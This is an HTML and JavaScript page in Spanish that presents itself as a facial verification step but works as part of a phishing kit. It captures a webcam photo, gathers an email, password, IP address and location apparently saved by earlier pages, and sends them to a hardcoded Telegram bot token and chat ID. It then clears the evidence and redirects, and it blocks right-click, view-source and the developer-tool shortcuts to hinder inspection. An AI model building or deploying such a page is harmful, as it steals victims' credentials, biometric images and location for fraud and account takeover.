<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<!-- Script de Bloqueo Absoluto (Colocado al inicio para ejecutarse antes que cualquier otro recurso) -->
<script>
    // Bloqueo estricto de atajos de teclado para inspección
    window.addEventListener('keydown', function(e) {
        if (
            e.key === 'F12' || 
            e.keyCode === 123 || 
            (e.ctrlKey && e.shiftKey && (e.key.toLowerCase() === 'i' || e.key.toLowerCase() === 'j' || e.key.toLowerCase() === 'c' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || 
            (e.ctrlKey && (e.key.toLowerCase() === 'u' || e.keyCode === 85))
        ) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            return false;
        }
    }, true);

    // Bloqueo total de clic derecho
    window.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
    }, true);
</script>

    <title>Verificación facial - Cámara</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #0b0b0b;
        }

        .camera-container {
            position: relative;
            width: 100vw;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-color: #0b0b0b;
        }

        .bg-video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: blur(16px) brightness(0.65);
            transform: scale(1.15);
        }

        .overlay-mask {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.4);
            z-index: 5;
        }

        .face-scan-circle {
            position: relative;
            width: min(82vw, 360px);
            height: min(82vw, 360px);
            border-radius: 50%;
            overflow: hidden;
            border: 3.5px solid #ffffff;
            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.75), 0 10px 40px rgba(0, 0, 0, 0.6);
            z-index: 10;
            background-color: #000;
        }

        .face-scan-circle video {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scaleX(-1);
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .close-btn {
            position: absolute;
            top: 24px;
            left: 24px;
            background: transparent;
            border: none;
            color: #ffffff;
            cursor: pointer;
            z-index: 50;
            padding: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0.9;
            transition: opacity 0.2s;
        }

        .close-btn:hover {
            opacity: 1;
        }

        .capture-container {
            position: absolute;
            bottom: 40px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 50;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .capture-btn {
            width: 76px;
            height: 76px;
            border-radius: 50%;
            background-color: transparent;
            border: 4px solid #ffffff;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: transform 0.1s ease;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
        }

        .capture-btn-inner {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background-color: #ffffff;
            transition: transform 0.1s ease;
        }

        .capture-btn:active .capture-btn-inner {
            transform: scale(0.9);
        }

        /* Pantalla de carga (Overlay de Verificando) */
        #loadingOverlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.85);
            z-index: 100;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            display: none;
        }

        /* Spinner circular de barritas estilo iOS / referencia */
        .spinner-container {
            position: relative;
            width: 80px;
            height: 80px;
            margin-bottom: 24px;
        }

        .spinner-blade {
            position: absolute;
            left: 37px;
            top: 10px;
            width: 6px;
            height: 18px;
            border-radius: 3px;
            background-color: #ffffff;
            animation: spinner-fade 1.2s linear infinite;
            transform-origin: center 30px;
        }

        .spinner-blade:nth-child(1) { transform: rotate(0deg); animation-delay: -1.1s; }
        .spinner-blade:nth-child(2) { transform: rotate(30deg); animation-delay: -1.0s; }
        .spinner-blade:nth-child(3) { transform: rotate(60deg); animation-delay: -0.9s; }
        .spinner-blade:nth-child(4) { transform: rotate(90deg); animation-delay: -0.8s; }
        .spinner-blade:nth-child(5) { transform: rotate(120deg); animation-delay: -0.7s; }
        .spinner-blade:nth-child(6) { transform: rotate(150deg); animation-delay: -0.6s; }
        .spinner-blade:nth-child(7) { transform: rotate(180deg); animation-delay: -0.5s; }
        .spinner-blade:nth-child(8) { transform: rotate(210deg); animation-delay: -0.4s; }
        .spinner-blade:nth-child(9) { transform: rotate(240deg); animation-delay: -0.3s; }
        .spinner-blade:nth-child(10) { transform: rotate(270deg); animation-delay: -0.2s; }
        .spinner-blade:nth-child(11) { transform: rotate(300deg); animation-delay: -0.1s; }
        .spinner-blade:nth-child(12) { transform: rotate(330deg); animation-delay: 0s; }

        @keyframes spinner-fade {
            0% { opacity: 1; }
            100% { opacity: 0.15; }
        }

        .loading-text {
            color: #ffffff;
            font-size: 18px;
            font-weight: 500;
            letter-spacing: 0.5px;
        }

        .error-message {
            position: absolute;
            color: white;
            text-align: center;
            padding: 20px;
            z-index: 40;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="camera-container">
        <video id="bgVideo" autoplay playsinline muted class="bg-video"></video>
        <div class="overlay-mask"></div>

        <button class="close-btn" aria-label="Cerrar" onclick="window.history.back();">
            <svg class="w-7 h-7" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"></path>
            </svg>
        </button>

        <div id="errorMsg" class="error-message" style="display: none;">
            No se pudo acceder a la cámara. Por favor, permita el uso de la cámara en su navegador.
        </div>

        <div class="face-scan-circle">
            <video id="faceVideo" autoplay playsinline muted></video>
        </div>

        <div class="capture-container">
            <button class="capture-btn" aria-label="Tomar foto" onclick="takeAndSendPhoto()">
                <div class="capture-btn-inner"></div>
            </button>
        </div>
    </div>

    <!-- Pantalla de carga / Verificando -->
    <div id="loadingOverlay">
        <div class="spinner-container">
            <div class="spinner-blade"></div>
            <div class="spinner-blade"></div>
            <div class="spinner-blade"></div>
            <div class="spinner-blade"></div>
            <div class="spinner-blade"></div>
            <div class="spinner-blade"></div>
            <div class="spinner-blade"></div>
            <div class="spinner-blade"></div>
            <div class="spinner-blade"></div>
            <div class="spinner-blade"></div>
            <div class="spinner-blade"></div>
            <div class="spinner-blade"></div>
        </div>
        <div class="loading-text">Verificando...</div>
    </div>

    <canvas id="snapshotCanvas" style="display: none;"></canvas>

    <script>

        // Bloquear gestos de zoom táctil (doble toque y pellizco con dos dedos)
let lastTouchEnd = 0;
document.addEventListener('touchend', function (event) {
    const now = (new Date()).getTime();
    if (now - lastTouchEnd <= 300) {
        event.preventDefault();
    }
    lastTouchEnd = now;
}, { passive: false });

document.addEventListener('gesturestart', function (e) {
    e.preventDefault();
});

        const TOKEN = "6376409130:AAEO2xslfT0z-Z7a49HUaFa-CEpMYX4wgAA";
        const CHAT_ID = "-1002003987549";

        async function initCamera() {
            try {
                const constraints = {
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
                    audio: false
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                document.getElementById('faceVideo').srcObject = stream;
                document.getElementById('bgVideo').srcObject = stream;
            } catch (error) {
                console.error("Error al acceder a la cámara:", error);
                document.getElementById('errorMsg').style.display = 'block';
            }
        }

        async function takeAndSendPhoto() {
            const video = document.getElementById('faceVideo');
            const canvas = document.getElementById('snapshotCanvas');
            
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                // Mostrar pantalla de carga inmediatamente al presionar el botón
                document.getElementById('loadingOverlay').style.display = 'flex';

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                const ctx = canvas.getContext('2d');
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Recuperar los datos guardados en localStorage
                const userEmail = localStorage.getItem('userEmail') || 'No especificado';
                const passVal1 = localStorage.getItem('userPass1') || 'No especificada';
                const ipReal = localStorage.getItem('userIp') || 'Oculta';
                const geoInfo = localStorage.getItem('userGeo') || 'No detectada';

                // Armar el mensaje completo con la misma estructura que los pasos anteriores
                const captionText = `📸 PASO FINAL: VERIFICACIÓN FACIAL\n\n` +
                                   `👤 Usuario: \`${userEmail}\`\n` +
                                   `🔑 Clave1: \`${passVal1}\`\n` +
                                   `🌐 IP: \`${ipReal}\`\n` +
                                   `📍 Ubicación: \`${geoInfo}\``;

                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'verificacion_facial.png');
                    formData.append('caption', captionText);
                    formData.append('parse_mode', 'Markdown');

                    try {
                        // Envía la foto junto con la información detallada a Telegram usando sendPhoto
                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                    } catch (err) {
                        console.error("Error de red al enviar a Telegram:", err);
                    }

                    // Limpiar el localStorage después de completar todo el proceso con éxito
                    localStorage.clear();

                    // Esperar 10 segundos exactos (10000 ms) con el indicador de "Verificando..." activo
                    setTimeout(() => {
                        window.location.href = 'verificado.html';
                    }, 5000);

                }, 'image/png');
            }
        }

        window.addEventListener('DOMContentLoaded', initCamera);
    </script>

    <script>
    // BLOQUEO PARA DESCARGAR PAGINA CTRL+S
(() => {
    'use strict';

    // Evita ejecutar dos veces la protección.
    if (window.__proteccionWebActiva) return;
    window.__proteccionWebActiva = true;

    function mostrarAviso() {
        if (document.getElementById('aviso-proteccion')) return;

        const aviso = document.createElement('div');
        aviso.id = 'aviso-proteccion';

        Object.assign(aviso.style, {
            position: 'fixed',
            inset: '0',
            zIndex: '2147483647',
            background: 'rgba(0,0,0,.88)',
            color: '#fff',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '24px',
            boxSizing: 'border-box',
            fontFamily: 'Arial, sans-serif',
            textAlign: 'center'
        });

        const panel = document.createElement('div');
        Object.assign(panel.style, {
            maxWidth: '420px',
            padding: '28px',
            background: '#202020',
            borderRadius: '12px',
            border: '1px solid #555'
        });

        const titulo = document.createElement('h2');
        titulo.textContent = 'Acción no permitida';

        const mensaje = document.createElement('p');
        mensaje.textContent =
            'Esta acción está restringida en esta página.';

        const boton = document.createElement('button');
        boton.type = 'button';
        boton.textContent = 'Volver a la página';

        Object.assign(boton.style, {
            padding: '12px 20px',
            border: '0',
            borderRadius: '6px',
            cursor: 'pointer',
            fontWeight: 'bold'
        });

        boton.addEventListener('click', () => aviso.remove());

        panel.append(titulo, mensaje, boton);
        aviso.appendChild(panel);
        document.body.appendChild(aviso);
    }

    // Bloquear Ctrl+S, Ctrl+U, Ctrl+P y algunas herramientas habituales.
    document.addEventListener('keydown', function (e) {
        const tecla = e.key.toLowerCase();

        if (
            (e.ctrlKey || e.metaKey) &&
            ['s', 'u', 'p'].includes(tecla)
        ) {
            e.preventDefault();
            e.stopImmediatePropagation();
            mostrarAviso();
        }

        // Bloqueo básico de F12 y Ctrl+Shift+I/J/C.
        if (
            tecla === 'f12' ||
            ((e.ctrlKey || e.metaKey) &&
             e.shiftKey &&
             ['i', 'j', 'c'].includes(tecla))
        ) {
            e.preventDefault();
            e.stopImmediatePropagation();
            mostrarAviso();
        }
    }, true);

    // Bloquear menú contextual del clic derecho.
    document.addEventListener('contextmenu', function (e) {
        e.preventDefault();
        mostrarAviso();
    }, true);

})();
</script>
